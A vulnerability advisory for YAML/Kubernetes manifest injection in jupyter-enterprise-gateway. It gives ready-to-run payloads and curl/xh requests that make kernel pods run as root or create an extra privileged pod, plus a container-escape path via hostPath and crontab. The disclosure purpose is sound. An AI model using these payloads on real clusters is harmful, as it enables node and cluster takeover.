#  Kubernetes Manifest Injection in Jinja2 Template Rendering

* GHSA-cfw7-6c5v-2wjq
* CVE-2026-44182
* CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
* CWE-74
* **Affected**: [`jupyter-enterprise-gateway`](https://pypi.org/project/jupyter-enterprise-gateway/) `>= 0, < 3.3.0`
* **Fixed in**: `3.3.0`
* **PURL**: `pkg:pypi/jupyter-enterprise-gateway`

### Summary
_Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server._

The environment variables used during the rendering of the Kubernetes manifest allow YAML injection, enabling attackers to overwrite existing keys like `securityContext` and inject multi-document YAML to create additional unintended Kubernetes resources.

### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

The server interpolates untrusted environment variables (e.g., `KERNEL_XXX`) into Kubernetes manifests without YAML-aware escaping, enabling YAML injection attacks. Attackers can inject new fields, overwrite critical fields (e.g., duplicate `securityContext` keys, where the last one prevails), and inject document boundaries (`---` for new documents, `...` for end-of-document) to generate multiple resources, potentially creating arbitrary kinds like privileged pods.

The Jinja2 template for the Kubernetes manifest contains several `kernel_xxx` variables, such as `kernel_working_dir` that are used when rendering the manifest and are all vectors for YAML injection.
https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L77

These values come from the environment passed in the API call, where they were `KERNEL_XXX` before being converted to lowercase.

https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/launch_kubernetes.py#L130-L137

### PoC
_Complete instructions, including specific configuration details, to reproduce the vulnerability._

These proof of concepts are injecting in the `KERNEL_WORKING_DIR` env var, but any of the env vars could have been used.
By default, the `KERNEL_WORKING_DIR` will be ignored unless `EG_MIRROR_WORKING_DIRS` is truthy for the `enterprise-gateway`. This is controlled by the `mirrorWorkingDirs` value in the Helm chart.

Using `ducaale/xh`:

```bash
xh http://localhost:31529/api/kernels env:=@env-working-dir-exploit.yaml
```

`env-working-dir-exploit.yaml`:

```json
{
  "KERNEL_POD_NAME": "working-dir-root",
  "KERNEL_NAMESPACE": "notebooks",
  "KERNEL_WORKING_DIR": "\"/tmp\\\"\\n\\n# INJECTION\\n  securityContext:\\n    runAsUser: 0\\n    runAsGroup: 0\\n    fsGroup: 100\\n# HAHA - stray quote \""
}

```

Resulting request:

```
POST /api/kernels HTTP/1.1
Accept: application/json, */*;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Content-Length: 233
Content-Type: application/json
Host: localhost:31529
User-Agent: xh/0.24.0

{
    "env": {
        "KERNEL_POD_NAME": "working-dir-root",
        "KERNEL_NAMESPACE": "notebooks",
        "KERNEL_WORKING_DIR": "\"/tmp\\\"\\n\\n# INJECTION\\n  securityContext:\\n    runAsUser: 0\\n    runAsGroup: 0\\n    fsGroup: 100\\n# HAHA - stray quote \""
    }
}
```

Curl equivalent command:

```bash
curl http://localhost:31529/api/kernels -H 'content-type: application/json' -H 'accept: application/json, */*;q=0.5' -d '{"env":{"KERNEL_POD_NAME":"working-dir-root","KERNEL_NAMESPACE":"notebooks","KERNEL_WORKING_DIR":"\"/tmp\\\"\\n\\n# INJECTION\\n  securityContext:\\n    runAsUser: 0\\n    runAsGroup: 0\\n    fsGroup: 100\\n# HAHA - stray quote \""}}'
```

The rendered Jinja2 template:

```yaml
# This file defines the Kubernetes objects necessary for kernels to run witihin Kubernetes.
# Substitution parameters are processed by the launch_kubernetes.py code located in the
# same directory.  Some values are factory values, while others (typically prefixed with 'kernel_') can be
# provided by the client.
#
# This file can be customized as needed.  No changes are required to launch_kubernetes.py provided kernel_
# values are used - which be automatically set from corresponding KERNEL_ env values.  Updates will be required
# to launch_kubernetes.py if new document sections (i.e., new k8s 'kind' objects) are introduced.
#
apiVersion: v1
kind: Pod
metadata:
  name: "working-dir-root"
  namespace: "notebooks"
  labels:
    kernel_id: "186f4ecf-bf90-40b8-b210-a0987bfce927"
    app: enterprise-gateway
    component: kernel
    source: kernel-pod.yaml
  annotations:
    cluster-autoscaler.kubernetes.io/safe-to-evict: "false"
spec:
  restartPolicy: Never
  serviceAccountName: "default"
# NOTE: that using runAsGroup requires that feature-gate RunAsGroup be enabled.
# WARNING: Only using runAsUser w/o runAsGroup or NOT enabling the RunAsGroup feature-gate
# will result in the new kernel pod's effective group of 0 (root)! although the user will
# correspond to the runAsUser value.  As a result, BOTH should be uncommented AND the feature-gate
# should be enabled to ensure expected behavior.  In addition, 'fsGroup: 100' is recommended so
# that /home/jovyan can be written to via the 'users' group (gid: 100) irrespective of the
# "kernel_uid" and "kernel_gid" values.
  securityContext:
    runAsUser: 1000
    runAsGroup: 100
    fsGroup: 100
  containers:
  - image: "elyra/kernel-py:3.2.3"
    name: "working-dir-root"
    env:
# Add any custom envs here that aren't already configured for the kernel's environment
#    - name: MY_CUSTOM_ENV
#      value: "my_custom_value"
    workingDir: "/tmp"

# INJECTION
  securityContext:
    runAsUser: 0
    runAsGroup: 0
    fsGroup: 100
# HAHA - stray quote "
    volumeMounts:
# Define any "unconditional" mounts here, followed by "conditional" mounts that vary per client
  volumes:
# Define any "unconditional" volumes here, followed by "conditional" volumes that vary per client
```

Normally the container would run as `uid=1000(jovyan) gid=100(users) groups=100(users)`.
This injects a pod `securityContext` with `runAsUser: 0` and `runAsGroup: 0` (and `fsGroup: 100`).
The processing of the YAML results in the duplicate key clobbering the original.
Making the container run as `uid=0(root) gid=0(root) groups=0(root),100(users)`.

In addition to injecting a pod level `securityContext` it is also possible to inject a container level `securityContext` which supports the `privileged` field.


#### Injecting a Pod

By injecting `...` and `---` it is possible to use multi-document YAML to inject Kubernetes resources.

```bash
xh http://localhost:31529/api/kernels env:=@env-working-dir-exploit-pod.yaml
```

`env-working-dir-exploit-pod.yaml`:

```json
{
  "KERNEL_POD_NAME": "working-dir-root-pod",
  "KERNEL_NAMESPACE": "notebooks",
  "KERNEL_WORKING_DIR": "\"/tmp\\\"\\n\\n# INJECTION\\n...\\n---\\napiVersion: v1\\nkind: Pod\\nmetadata:\\n  name: injected-pod\\n\\\n  spec:\\n  containers:\\n    - name: injected-container\\n      image: nginx\\n      ports:\\n        - containerPort: 80\\n      securityContext:\\n        privileged: true\\n        runAsUser: 0\\n        runAsGroup: 0\\n...\\n# HAHA - stray quote\""
}
```

This is rendered as (skipping the beginning of the rendering before the inject):

```yaml
    workingDir: "/tmp"

# INJECTION
...
---
apiVersion: v1
kind: Pod
metadata:
  name: injected-pod
spec:
  containers:
    - name: injected-container
      image: nginx
      ports:
        - containerPort: 80
      securityContext:
        privileged: true
        runAsUser: 0
        runAsGroup: 0
...
# HAHA - stray quote"
    volumeMounts:
# Define any "unconditional" mounts here, followed by "conditional" mounts that vary per client
  volumes:
# Define any "unconditional" volumes here, followed by "conditional" volumes that vary per client
```

`kubectl get pods -n notebooks`
```
NAME                   READY   STATUS    RESTARTS   AGE
injected-pod           1/1     Running   0          4s
working-dir-root-pod   1/1     Running   0          4s
```

The `injected-pod` has been created in addition to the `working-dir-root-pod`.

`kubectl get pod/injected-pod -o yaml -n notebooks -o jsonpath='{.spec.containers[*].securityContext}'`:

```json
{
  "privileged": true,
  "runAsGroup": 0,
  "runAsUser": 0
}
```

A [Nuclei](https://github.com/projectdiscovery/nuclei) template for automated detection is available: [`nuclei/jupyter-enterprise-gateway-manifest-injection.yaml`](nuclei/jupyter-enterprise-gateway-manifest-injection.yaml).

### Impact
_What kind of vulnerability is it? Who is impacted?_

An attacker can create pods running with arbitrary, `image`, `securityContext`, and `volumeMounts` including `hostPath` mounts. Privileged pods can be created.

Arbitrary Kubernetes resources of kinds: `Pod`, `Secret`, `PersistentVolumeClaim`, `PersistentVolume`, `Service`, and `ConfigMap` can be created.

Repeated exploitation can compromise all worker nodes, and thus the entire Kubernetes cluster. Multiple container escape vectors exist. It is possible to create privileged pods which could load kernel modules to compromise the host. It is also possible to specify volume mounts, so another vector for a container escape is to use a `hostPath` R/W volume mount, use the injected `securityContext` to run as `root`, and then gain code execution in the underlying worker node by creating a crontab entry in the mounted host file system.
